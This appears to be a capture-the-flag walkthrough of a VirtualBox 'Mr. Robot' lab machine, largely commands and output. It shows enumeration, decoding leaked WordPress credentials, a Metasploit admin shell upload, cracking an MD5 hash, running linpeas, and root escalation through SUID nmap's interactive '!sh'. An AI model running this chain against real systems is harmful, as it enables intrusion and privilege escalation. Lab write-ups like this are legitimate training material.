Nmap
nmap -sV -p- 192.168.1.83  
Starting Nmap 7.99 ( https://nmap.org ) at 2026-07-12 15:15 -0400  
Nmap scan report for 192.168.1.83  
Host is up (0.00024s latency).  
Not shown: 65532 filtered tcp ports (no-response)  
PORT    STATE  SERVICE  VERSION  
22/tcp  closed ssh  
**80/tcp  open   http     Apache httpd**  
**443/tcp open   ssl/http Apache httpd**  
MAC Address: 08:00:27:6E:46:02 (Oracle VirtualBox virtual NIC)

┌──(kode㉿localhost)-[~/Downloads]  
└─$ dirb http://192.168.1.83            
  
-----------------  
DIRB v2.22       
By The Dark Raver  
-----------------  
  
START_TIME: Sun Jul 12 13:15:06 2026  
URL_BASE: http://192.168.1.83/  
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt  
  
-----------------  
  
GENERATED WORDS: 4612                                                             
  
---- Scanning URL: http://192.168.1.83/ ----  
                                                                             
http://192.168.1.83/license (CODE:200|SIZE:309)                                                                   
http://192.168.1.83/login (CODE:302|SIZE:0)                                                                       
http://192.168.1.83/readme (CODE:200|SIZE:64)                                                                     
http://192.168.1.83/robots (CODE:200|SIZE:41)                                                                     
http://192.168.1.83/robots.txt (CODE:200|SIZE:41)                                                                 

http://192.168.1.83/license
ZWxsaW90OkVSMjgtMDY1Mgo=

Base64
elliot:ER28-0652
Admin de Wordpress

https://www.rapid7.com/db/modules/exploit/unix/webapp/wp_admin_shell_upload/

87   exploit/unix/webapp/wp_admin_shell_upload  2015-02-21       excellent  Yes

msf exploit(unix/webapp/wp_admin_shell_upload) > set USERNAME elliot  
USERNAME => elliot  
msf exploit(unix/webapp/wp_admin_shell_upload) > set PASSWORD ER28-0652  
PASSWORD => ER28-0652  
msf exploit(unix/webapp/wp_admin_shell_upload) > set RHOST 192.168.1.87  
RHOST => 192.168.1.87    
msf exploit(unix/webapp/wp_admin_shell_upload) > set WPCHECK false  
WPCHECK => false  
msf exploit(unix/webapp/wp_admin_shell_upload) > exploit

meterpreter>  shell

**TTY (Terminal Teletype)**
`python -c 'import pty; pty.spawn("/bin/bash")'`
`python -c 'import pty; pty.spawn("/bin/sh")'`

$ cd /home/  
cd /home/  
$ ls  
ls  
robot  
$ cd robot  
cd robot  
$ ls  
ls  
key-2-of-3.txt  password.raw-md5
daemon@linux:/home/robot$ cat password.raw-md5  
cat password.raw-md5  
robot:c3fcd3d76192e4007dfb496cca67e13b

| Hash                             | Type | Result                     |
| -------------------------------- | ---- | -------------------------- |
| c3fcd3d76192e4007dfb496cca67e13b | md5  | abcdefghijklmnopqrstuvwxyz |
daemon@linux:/home/robot$ su robot  
su robot  
Password: abcdefghijklmnopqrstuvwxyz

robot@linux:/tmp$ chmod +x linpeas_linux_amd64  
chmod +x linpeas_linux_amd64  
robot@linux:/tmp$ ./linpeas_linux_amd64
robot@linux:~$ cd /tmp  
cd /tmp  
robot@linux:/tmp$ wget https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas_linux_amd64

╔══════════╣ SUID - Check easy privesc, exploits and write perms (T1548.001)  
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#sudo-and-suid  
strace Not Found  
-rwsr-xr-x 1 root root 44K May  7  2014 /bin/ping  
-rwsr-xr-x 1 root root 68K Feb 12  2015 /bin/umount  --->  BSD/Linux(08-1996)  
-rwsr-xr-x 1 root root 93K Feb 12  2015 /bin/mount  --->  Apple_Mac_OSX(Lion)_Kernel_xnu-1699.32.7_except_xnu-1699.24.8  
-rwsr-xr-x 1 root root 44K May  7  2014 /bin/ping6  
-rwsr-xr-x 1 root root 37K Feb 17  2014 /bin/su  
-rwsr-xr-x 1 root root 46K Feb 17  2014 /usr/bin/passwd  --->  Apple_Mac_OSX(03-2006)/Solaris_8/9(12-2004)/SPARC_8/9/Sun_Solaris_2.3_t  
o_2.5.1(02-1997)  
-rwsr-xr-x 1 root root 32K Feb 17  2014 /usr/bin/newgrp  --->  HP-UX_10.20  
-rwsr-xr-x 1 root root 41K Feb 17  2014 /usr/bin/chsh  
-rwsr-xr-x 1 root root 46K Feb 17  2014 /usr/bin/chfn  --->  SuSE_9.3/10  
-rwsr-xr-x 1 root root 67K Feb 17  2014 /usr/bin/gpasswd  
-rwsr-xr-x 1 root root 152K Mar 12  2015 /usr/bin/sudo  --->  check_if_the_sudo_version_is_vulnerable  
==-rwsr-xr-x 1 root root 493K Nov 13  2015 /usr/local/bin/nmap==  
-rwsr-xr-x 1 root root 431K May 12  2014 /usr/lib/openssh/ssh-keysign  
-rwsr-xr-x 1 root root 10K Feb 25  2014 /usr/lib/eject/dmcrypt-get-device  
-r-sr-xr-x 1 root root 9.4K Nov 13  2015 /usr/lib/vmware-tools/bin32/vmware-user-suid-wrapper  
-r-sr-xr-x 1 root root 14K Nov 13  2015 /usr/lib/vmware-tools/bin64/vmware-user-suid-wrapper  
-rwsr-xr-x 1 root root 11K Feb 25  2015 /usr/lib/pt_chown  --->  GNU_glibc_2.1/2.1.1_-6(08-1999)

robot@linux:/tmp$ nmap --interactive  
nmap --interactive  
  
Starting nmap V. 3.81 ( http://www.insecure.org/nmap/ )  
Welcome to Interactive Mode -- press h <enter> for help  
nmap> h  
h  
Nmap Interactive Commands:  
n <nmap args> -- executes an nmap scan using the arguments given and  
waits for nmap to finish.  Results are printed to the  
screen (of course you can still use file output commands).  
! <command>   -- runs shell command given in the foreground  
x             -- Exit Nmap  
f [--spoof <fakeargs>] [--nmap_path <path>] <nmap args>  
-- Executes nmap in the background (results are NOT  
printed to the screen).  You should generally specify a  
file for results (with -oX, -oG, or -oN).  If you specify  
fakeargs with --spoof, Nmap will try to make those  
appear in ps listings.  If you wish to execute a special  
version of Nmap, specify --nmap_path.  
n -h          -- Obtain help with Nmap syntax  
h             -- Prints this help screen.  
Examples:  
n -sS -O -v example.com/24  
f --spoof "/usr/local/bin/pico -z hello.c" -sS -oN e.log example.com/24  
  
nmap> !  
!  
waiting to reap child : No child processes  
nmap> whoami  
whoami  
Unknown command (whoami) -- press h <enter> for help  
nmap> !whoami  
!whoami  
root  
waiting to reap child : No child processes  
nmap> !sh  
!sh  
# cd /root    
cd /root  
# ls  
ls  
firstboot_done  key-3-of-3.txt
# cat key-3-of-3.txt  
cat key-3-of-3.txt  
04787ddef27c3dee1ee161b21670b4e4

https://hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#sudo-and-suid
https://www.rapid7.com/db/modules/exploit/unix/webapp/wp_admin_shell_upload/
https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS